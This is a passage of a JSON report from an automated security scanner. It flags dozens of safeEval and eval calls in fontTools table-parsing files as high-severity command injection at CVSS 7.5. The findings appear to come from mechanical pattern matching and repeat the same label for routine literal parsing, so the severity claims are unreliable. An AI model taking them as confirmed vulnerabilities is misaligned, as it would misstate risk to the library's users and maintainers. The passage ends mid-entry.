            "line": 206,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = safeEval(attrs[\"value\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = safeEval(attrs[\"value\"])\n        elif name == \"ratRanges\":\n            if not hasattr(self, \"ratRanges\"):\n                self.ratRanges = []",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 220,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"bCharSet\": safeEval(attrs[\"bCharSet\"]),",
            "context": "                    else:\n                        self.numRatios += 1\n                    ratio = {\n                        \"bCharSet\": safeEval(attrs[\"bCharSet\"]),\n                        \"xRatio\": safeEval(attrs[\"xRatio\"]),\n                        \"yStartRatio\": safeEval(attrs[\"yStartRatio\"]),\n                        \"yEndRatio\": safeEval(attrs[\"yEndRatio\"]),",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 221,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"xRatio\": safeEval(attrs[\"xRatio\"]),",
            "context": "                        self.numRatios += 1\n                    ratio = {\n                        \"bCharSet\": safeEval(attrs[\"bCharSet\"]),\n                        \"xRatio\": safeEval(attrs[\"xRatio\"]),\n                        \"yStartRatio\": safeEval(attrs[\"yStartRatio\"]),\n                        \"yEndRatio\": safeEval(attrs[\"yEndRatio\"]),\n                        \"groupIndex\": safeEval(attrs[\"groupIndex\"]),",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 222,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"yStartRatio\": safeEval(attrs[\"yStartRatio\"]),",
            "context": "                    ratio = {\n                        \"bCharSet\": safeEval(attrs[\"bCharSet\"]),\n                        \"xRatio\": safeEval(attrs[\"xRatio\"]),\n                        \"yStartRatio\": safeEval(attrs[\"yStartRatio\"]),\n                        \"yEndRatio\": safeEval(attrs[\"yEndRatio\"]),\n                        \"groupIndex\": safeEval(attrs[\"groupIndex\"]),\n                    }",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 223,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"yEndRatio\": safeEval(attrs[\"yEndRatio\"]),",
            "context": "                        \"bCharSet\": safeEval(attrs[\"bCharSet\"]),\n                        \"xRatio\": safeEval(attrs[\"xRatio\"]),\n                        \"yStartRatio\": safeEval(attrs[\"yStartRatio\"]),\n                        \"yEndRatio\": safeEval(attrs[\"yEndRatio\"]),\n                        \"groupIndex\": safeEval(attrs[\"groupIndex\"]),\n                    }\n                    self.ratRanges.append(ratio)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 224,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"groupIndex\": safeEval(attrs[\"groupIndex\"]),",
            "context": "                        \"xRatio\": safeEval(attrs[\"xRatio\"]),\n                        \"yStartRatio\": safeEval(attrs[\"yStartRatio\"]),\n                        \"yEndRatio\": safeEval(attrs[\"yEndRatio\"]),\n                        \"groupIndex\": safeEval(attrs[\"groupIndex\"]),\n                    }\n                    self.ratRanges.append(ratio)\n        elif name == \"groups\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 245,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "yPelHeight = safeEval(attrs[\"yPelHeight\"])",
            "context": "                            continue\n                        name, attrs, content = element\n                        if name == \"record\":\n                            yPelHeight = safeEval(attrs[\"yPelHeight\"])\n                            yMax = safeEval(attrs[\"yMax\"])\n                            yMin = safeEval(attrs[\"yMin\"])\n                            group[yPelHeight] = (yMax, yMin)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 246,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "yMax = safeEval(attrs[\"yMax\"])",
            "context": "                        name, attrs, content = element\n                        if name == \"record\":\n                            yPelHeight = safeEval(attrs[\"yPelHeight\"])\n                            yMax = safeEval(attrs[\"yMax\"])\n                            yMin = safeEval(attrs[\"yMin\"])\n                            group[yPelHeight] = (yMax, yMin)\n                    self.groups.append(group)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_D_M_X_.py",
            "line": 247,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "yMin = safeEval(attrs[\"yMin\"])",
            "context": "                        if name == \"record\":\n                            yPelHeight = safeEval(attrs[\"yPelHeight\"])\n                            yMax = safeEval(attrs[\"yMax\"])\n                            yMin = safeEval(attrs[\"yMin\"])\n                            group[yPelHeight] = (yMax, yMin)\n                    self.groups.append(group)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 80,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "converterClass = eval(tp, tableNamespace, converterMapping)",
            "context": "                tableName = tp\n                converterClass = Struct\n            else:\n                converterClass = eval(tp, tableNamespace, converterMapping)\n\n        conv = converterClass(name, repeat, aux, description=descr)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 623,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if \"empty\" in attrs and safeEval(attrs[\"empty\"]):",
            "context": "            value.toXML(xmlWriter, font, attrs, name=name)\n\n    def xmlRead(self, attrs, content, font):\n        if \"empty\" in attrs and safeEval(attrs[\"empty\"]):\n            return None\n        table = self.tableClass()\n        Format = attrs.get(\"Format\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1217,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "covFlags = safeEval(eltAttrs[\"value\"])",
            "context": "        for eltName, eltAttrs, eltContent in filter(istuple, content):\n            if eltName == \"CoverageFlags\":\n                # Only in XML from old versions of fonttools.\n                covFlags = safeEval(eltAttrs[\"value\"])\n                orderKey = ((covFlags & 0x40) != 0, (covFlags & 0x10) != 0)\n                m.ProcessingOrder = self._PROCESSING_ORDERS[orderKey]\n                self._setTextDirectionFromCoverageFlags(covFlags, m)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1232,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "m.Reserved = safeEval(eltAttrs[\"value\"])",
            "context": "                    \"unknown TextDirection %s\" % m.TextDirection\n                )\n            elif eltName == \"Reserved\":\n                m.Reserved = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"SubFeatureFlags\":\n                m.SubFeatureFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName.endswith(\"Morph\"):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1234,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "m.SubFeatureFlags = safeEval(eltAttrs[\"value\"])",
            "context": "            elif eltName == \"Reserved\":\n                m.Reserved = safeEval(eltAttrs[\"value\"])\n            elif eltName == \"SubFeatureFlags\":\n                m.SubFeatureFlags = safeEval(eltAttrs[\"value\"])\n            elif eltName.endswith(\"Morph\"):\n                m.fromXML(eltName, eltAttrs, eltContent, font)\n            else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1534,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "table.GlyphClasses[glyph] = safeEval(value)",
            "context": "            if eltName == \"GlyphClass\":\n                glyph = eltAttrs[\"glyph\"]\n                value = eltAttrs[\"value\"]\n                table.GlyphClasses[glyph] = safeEval(value)\n            elif eltName == \"State\":\n                state = self._xmlReadState(eltAttrs, eltContent, font)\n                table.States.append(state)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1554,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "glyphClass = safeEval(eltAttrs[\"onGlyphClass\"])",
            "context": "        state = AATState()\n        for eltName, eltAttrs, eltContent in filter(istuple, content):\n            if eltName == \"Transition\":\n                glyphClass = safeEval(eltAttrs[\"onGlyphClass\"])\n                transition = self.tableClass()\n                transition.fromXML(eltName, eltAttrs, eltContent, font)\n                state.Transitions[glyphClass] = transition",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1564,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ligComponents.append(safeEval(eltAttrs[\"value\"]))",
            "context": "        ligComponents = []\n        for eltName, eltAttrs, _eltContent in filter(istuple, content):\n            if eltName == \"LigComponent\":\n                ligComponents.append(safeEval(eltAttrs[\"value\"]))\n        return ligComponents\n\n    def _xmlReadLigatures(self, attrs, content, font):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1595,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result[safeEval(eAttrs[\"cid\"])] = eAttrs[\"glyph\"].strip()",
            "context": "        result = {}\n        for eName, eAttrs, _eContent in filter(istuple, content):\n            if eName == \"CID\":\n                result[safeEval(eAttrs[\"cid\"])] = eAttrs[\"glyph\"].strip()\n        return result\n\n    def xmlWrite(self, xmlWriter, font, value, name, attrs):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1642,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result[eAttrs[\"glyph\"]] = safeEval(eAttrs[\"value\"])",
            "context": "        result = {}\n        for eName, eAttrs, _eContent in filter(istuple, content):\n            if eName == \"CID\":\n                result[eAttrs[\"glyph\"]] = safeEval(eAttrs[\"value\"])\n        return result\n\n    def xmlWrite(self, xmlWriter, font, value, name, attrs):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1706,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return safeEval(attrs[\"value\"])",
            "context": "        xmlWriter.newline()\n\n    def xmlRead(self, attrs, content, font):\n        return safeEval(attrs[\"value\"])\n\n\nclass VarIdxMapValue(BaseConverter):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1805,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return safeEval(attrs[\"value\"])",
            "context": "        xmlWriter.newline()\n\n    def xmlRead(self, attrs, content, font):\n        return safeEval(attrs[\"value\"])\n\n\nclass TupleValues:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
            "line": 1819,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return safeEval(attrs[\"value\"])",
            "context": "        )\n\n    def xmlRead(self, attrs, content, font):\n        return safeEval(attrs[\"value\"])\n\n    def xmlWrite(self, xmlWriter, font, value, name, attrs):\n        xmlWriter.simpletag(name, attrs + [(\"value\", value)])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/D_S_I_G_.py",
            "line": 114,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.ulVersion = safeEval(attrs[\"version\"])",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"tableHeader\":\n            self.signatureRecords = []\n            self.ulVersion = safeEval(attrs[\"version\"])\n            self.usNumSigs = safeEval(attrs[\"numSigs\"])\n            self.usFlag = safeEval(attrs[\"flag\"])\n            return",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/D_S_I_G_.py",
            "line": 115,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.usNumSigs = safeEval(attrs[\"numSigs\"])",
            "context": "        if name == \"tableHeader\":\n            self.signatureRecords = []\n            self.ulVersion = safeEval(attrs[\"version\"])\n            self.usNumSigs = safeEval(attrs[\"numSigs\"])\n            self.usFlag = safeEval(attrs[\"flag\"])\n            return\n        if name == \"SignatureRecord\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/D_S_I_G_.py",
            "line": 116,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.usFlag = safeEval(attrs[\"flag\"])",
            "context": "            self.signatureRecords = []\n            self.ulVersion = safeEval(attrs[\"version\"])\n            self.usNumSigs = safeEval(attrs[\"numSigs\"])\n            self.usFlag = safeEval(attrs[\"flag\"])\n            return\n        if name == \"SignatureRecord\":\n            sigrec = SignatureRecord()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/D_S_I_G_.py",
            "line": 155,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.ulFormat = safeEval(attrs[\"format\"])",
            "context": "        writer.endtag(self.__class__.__name__)\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.ulFormat = safeEval(attrs[\"format\"])\n        self.usReserved1 = safeEval(attrs.get(\"reserved1\", \"0\"))\n        self.usReserved2 = safeEval(attrs.get(\"reserved2\", \"0\"))\n        self.pkcs7 = base64.b64decode(tobytes(strjoin(filter(pem_spam, content))))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/D_S_I_G_.py",
            "line": 156,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.usReserved1 = safeEval(attrs.get(\"reserved1\", \"0\"))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        self.ulFormat = safeEval(attrs[\"format\"])\n        self.usReserved1 = safeEval(attrs.get(\"reserved1\", \"0\"))\n        self.usReserved2 = safeEval(attrs.get(\"reserved2\", \"0\"))\n        self.pkcs7 = base64.b64decode(tobytes(strjoin(filter(pem_spam, content))))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/D_S_I_G_.py",
            "line": 157,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.usReserved2 = safeEval(attrs.get(\"reserved2\", \"0\"))",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        self.ulFormat = safeEval(attrs[\"format\"])\n        self.usReserved1 = safeEval(attrs.get(\"reserved1\", \"0\"))\n        self.usReserved2 = safeEval(attrs.get(\"reserved2\", \"0\"))\n        self.pkcs7 = base64.b64decode(tobytes(strjoin(filter(pem_spam, content))))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_O_R_G_.py",
            "line": 119,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "                vOriginRec.fromXML(name, attrs, content, ttFont)\n            self.VOriginRecords[vOriginRec.glyphName] = vOriginRec.vOrigin\n        elif \"value\" in attrs:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n\n    def __getitem__(self, glyphSelector):\n        if isinstance(glyphSelector, int):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/V_O_R_G_.py",
            "line": 165,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(value))",
            "context": "        if name == \"glyphName\":\n            setattr(self, name, value)\n        else:\n            setattr(self, name, safeEval(value))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_f_v_a_r.py",
            "line": 175,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "str2fl(value, 16) if tag.endswith(\"Value\") else safeEval(value),",
            "context": "                setattr(\n                    self,\n                    tag[0].lower() + tag[1:],\n                    str2fl(value, 16) if tag.endswith(\"Value\") else safeEval(value),\n                )\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_f_v_a_r.py",
            "line": 251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.subfamilyNameID = safeEval(attrs[\"subfamilyNameID\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        assert name == \"NamedInstance\"\n        self.subfamilyNameID = safeEval(attrs[\"subfamilyNameID\"])\n        self.flags = safeEval(attrs.get(\"flags\", \"0\"))\n        if \"postscriptNameID\" in attrs:\n            self.postscriptNameID = safeEval(attrs[\"postscriptNameID\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_f_v_a_r.py",
            "line": 252,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.flags = safeEval(attrs.get(\"flags\", \"0\"))",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        assert name == \"NamedInstance\"\n        self.subfamilyNameID = safeEval(attrs[\"subfamilyNameID\"])\n        self.flags = safeEval(attrs.get(\"flags\", \"0\"))\n        if \"postscriptNameID\" in attrs:\n            self.postscriptNameID = safeEval(attrs[\"postscriptNameID\"])\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_f_v_a_r.py",
            "line": 254,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.postscriptNameID = safeEval(attrs[\"postscriptNameID\"])",
            "context": "        self.subfamilyNameID = safeEval(attrs[\"subfamilyNameID\"])\n        self.flags = safeEval(attrs.get(\"flags\", \"0\"))\n        if \"postscriptNameID\" in attrs:\n            self.postscriptNameID = safeEval(attrs[\"postscriptNameID\"])\n        else:\n            self.postscriptNameID = 0xFFFF\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F__e_a_t.py",
            "line": 130,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = float(safeEval(attrs[\"version\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = float(safeEval(attrs[\"version\"]))\n        elif name == \"feature\":\n            fid = attrs[\"fid\"]\n            fobj = Feature()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F__e_a_t.py",
            "line": 134,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fobj.flags = int(safeEval(attrs[\"flags\"]))",
            "context": "        elif name == \"feature\":\n            fid = attrs[\"fid\"]\n            fobj = Feature()\n            fobj.flags = int(safeEval(attrs[\"flags\"]))\n            fobj.label = int(safeEval(attrs[\"label\"]))\n            fobj.default = int(safeEval(attrs.get(\"default\", \"0\")))\n            fobj.index = len(self.features)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F__e_a_t.py",
            "line": 135,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fobj.label = int(safeEval(attrs[\"label\"]))",
            "context": "            fid = attrs[\"fid\"]\n            fobj = Feature()\n            fobj.flags = int(safeEval(attrs[\"flags\"]))\n            fobj.label = int(safeEval(attrs[\"label\"]))\n            fobj.default = int(safeEval(attrs.get(\"default\", \"0\")))\n            fobj.index = len(self.features)\n            self.features[fid] = fobj",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F__e_a_t.py",
            "line": 136,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fobj.default = int(safeEval(attrs.get(\"default\", \"0\")))",
            "context": "            fobj = Feature()\n            fobj.flags = int(safeEval(attrs[\"flags\"]))\n            fobj.label = int(safeEval(attrs[\"label\"]))\n            fobj.default = int(safeEval(attrs.get(\"default\", \"0\")))\n            fobj.index = len(self.features)\n            self.features[fid] = fobj\n            fobj.settings = {}",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F__e_a_t.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fobj.settings[int(safeEval(a[\"value\"]))] = int(safeEval(a[\"label\"]))",
            "context": "                    continue\n                tag, a, c = element\n                if tag == \"setting\":\n                    fobj.settings[int(safeEval(a[\"value\"]))] = int(safeEval(a[\"label\"]))\n\n\nclass Feature(object):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F__e_a_t.py",
            "line": 145,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "fobj.settings[int(safeEval(a[\"value\"]))] = int(safeEval(a[\"label\"]))",
            "context": "                    continue\n                tag, a, c = element\n                if tag == \"setting\":\n                    fobj.settings[int(safeEval(a[\"value\"]))] = int(safeEval(a[\"label\"]))\n\n\nclass Feature(object):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_h_h_e_a.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "        if name == \"tableVersion\":\n            setattr(self, name, ve2fi(attrs[\"value\"]))\n            return\n        setattr(self, name, safeEval(attrs[\"value\"]))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_l_t_a_g.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = safeEval(attrs[\"value\"])",
            "context": "        if name == \"LanguageTag\":\n            self.tags.append(attrs[\"tag\"])\n        elif \"value\" in attrs:\n            value = safeEval(attrs[\"value\"])\n            setattr(self, name, value)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/O_S_2f_2.py",
            "line": 42,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "            writer.newline()\n\n    def fromXML(self, name, attrs, content, ttFont):\n        setattr(self, name, safeEval(attrs[\"value\"]))\n\n\n# 'sfnt' OS/2 and Windows Metrics table - 'OS/2'",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/O_S_2f_2.py",
            "line": 253,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(\"'''\" + attrs[\"value\"] + \"'''\"))",
            "context": "        ):\n            setattr(self, name, binary2num(attrs[\"value\"]))\n        elif name == \"achVendID\":\n            setattr(self, name, safeEval(\"'''\" + attrs[\"value\"] + \"'''\"))\n        else:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/O_S_2f_2.py",
            "line": 255,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "        elif name == \"achVendID\":\n            setattr(self, name, safeEval(\"'''\" + attrs[\"value\"] + \"'''\"))\n        else:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n\n    def updateFirstAndLastCharIndex(self, ttFont):\n        if \"cmap\" not in ttFont:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G__l_o_c.py",
            "line": 76,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.numAttribs = int(safeEval(attrs[\"number\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"attributes\":\n            self.numAttribs = int(safeEval(attrs[\"number\"]))\n\n    def __getitem__(self, index):\n        return self.locations[index]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_p_o_s_t.py",
            "line": 264,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name not in (\"psNames\", \"extraNames\", \"hexdata\"):\n            setattr(self, name, safeEval(attrs[\"value\"]))\n        elif name == \"psNames\":\n            self.mapping = {}\n            for element in content:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/M_E_T_A_.py",
            "line": 211,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "            glyphRec.offset = -1\n            glyphRec.nMetaEntry = len(glyphRec.stringRecs)\n        else:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n\n\nclass GlyphRecord(object):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/M_E_T_A_.py",
            "line": 243,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "                stringRec.fromXML(name, attrs, content, ttFont)\n            stringRec.stringLen = len(stringRec.string)\n        else:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n\n    def compile(self, parentTable):\n        data = sstruct.pack(METAGlyphRecordFormat, self)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/M_E_T_A_.py",
            "line": 286,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "uString = uString + chr(eval(\"0x\" + valStr))",
            "context": "                i = i + 1\n            valStr = string[j:i]\n\n            uString = uString + chr(eval(\"0x\" + valStr))\n        else:\n            uString = uString + chr(byteord(string[i]))\n        i = i + 1",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/M_E_T_A_.py",
            "line": 328,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(value))",
            "context": "            if name == \"string\":\n                self.string = mapXMLToUTF8(value)\n            else:\n                setattr(self, name, safeEval(value))\n\n    def compile(self, parentTable):\n        data = sstruct.pack(METAStringRecordFormat, self)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_v_t.py",
            "line": 41,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "index = safeEval(attrs[\"index\"])",
            "context": "        if not hasattr(self, \"values\"):\n            self.values = array.array(\"h\")\n        if name == \"cv\":\n            index = safeEval(attrs[\"index\"])\n            value = safeEval(attrs[\"value\"])\n            for i in range(1 + index - len(self.values)):\n                self.values.append(0)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_c_v_t.py",
            "line": 42,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = safeEval(attrs[\"value\"])",
